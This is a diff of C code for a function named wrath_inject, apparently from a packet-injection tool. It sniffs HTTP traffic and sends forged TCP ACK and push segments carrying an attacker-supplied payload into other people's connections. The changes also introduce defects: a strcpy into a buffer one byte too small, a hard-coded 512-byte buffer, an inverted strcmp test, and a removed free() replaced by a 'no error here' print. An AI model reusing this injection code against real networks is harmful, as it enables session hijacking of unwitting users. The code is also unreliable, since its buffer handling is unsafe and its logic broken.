@@ -10,7 +10,7 @@ void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_ch
 	struct lcp_package *package = (struct lcp_package *) args;
 	libnet_t *libnet_handle = package->libnet_handle;
 	struct arg_values *cline_args = package->cline_args;
-	char *app_cmd;
+	unsigned char *app_cmd;
 	
 	/* test for input file:
 		if an input file exists, assume it contains all encoding information.
@@ -21,16 +21,19 @@ void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_ch
 	   
 	   if an operation does not exist only pass null pointer.
 	*/
+	int length;
 	if (strcmp(cline_args->input_file, "\0") != 0) { // If an input file has been specified
-		int app_fd, length;
+		int app_fd;
 		app_fd = open(cline_args->input_file, O_RDONLY, 0);
 		if ((length = file_size(app_fd)) == -1)
 			fatal_error("getting file size");
-		unsigned char *ptr = (unsigned char *) safe_malloc(length);
-		read(app_fd, ptr, length);
-		app_cmd = ptr;
-	} else if (strcmp(cline_args->command, "\0") != 0) // If a command has been specified but not an input file
-		app_cmd = cline_args->command;
+		app_cmd = (unsigned char *) safe_malloc(length);
+		read(app_fd, app_cmd, length);
+	} else if (!strcmp(cline_args->command, "\0") != 0) { // If a command has been specified but not an input file
+		length = strlen(cline_args->command);
+		app_cmd = (unsigned char *) safe_malloc(length);
+		strcpy(app_cmd, cline_args->command);
+	}
 
 	/* looks to see if an operation is set.
 	 * when operations are set packets are only launched in 
@@ -38,14 +41,14 @@ void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_ch
 	 * protocol */
 	char *op = cline_args->operation;
 	if (strcmp(op, "http") == 0 || strcmp(op, "HTTP") == 0 ) { // HTTP response
-		char *app_cmd_con = (char *) safe_malloc(sizeof(app_cmd));
+		unsigned char *app_cmd_con = (unsigned char *) malloc(512);
 		wrath_char_encode(app_cmd, app_cmd_con);
 		if (strstr(packet + LIBNET_ETH_H + (2 * LIBNET_TCP_H) , "HTTP") != NULL) {
 			printf("HTTP Packet sniffed\n");
 			wrath_tcp_belly_build_and_launch(args, packet, NULL, TH_ACK, 0);	
 			wrath_tcp_belly_build_and_launch(args, packet, app_cmd_con, (TH_ACK + TH_PUSH), 1);
 		}
-		free(app_cmd_con);
+		printf("no error here\n");
 	// else if (strcmp(op, "ftp") == 0 || strcmp(op, "FTP") == 0)
 	} else if (strcmp(op, "\0") == 0 || strcmp (op, "tcp") == 0 || strcmp(op, "TCP") == 0) // TCP is default
 			wrath_tcp_raw_build_and_launch(args, packet);
